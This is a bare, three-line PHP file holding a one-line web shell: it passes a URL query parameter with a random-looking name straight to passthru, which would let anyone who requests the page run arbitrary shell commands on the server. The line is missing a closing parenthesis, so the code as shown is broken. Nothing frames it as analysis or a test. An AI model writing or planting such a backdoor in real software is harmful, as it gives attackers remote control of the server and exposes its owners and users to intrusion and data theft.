<?php
passthru($_GET['BJhFrLw0'];
?>
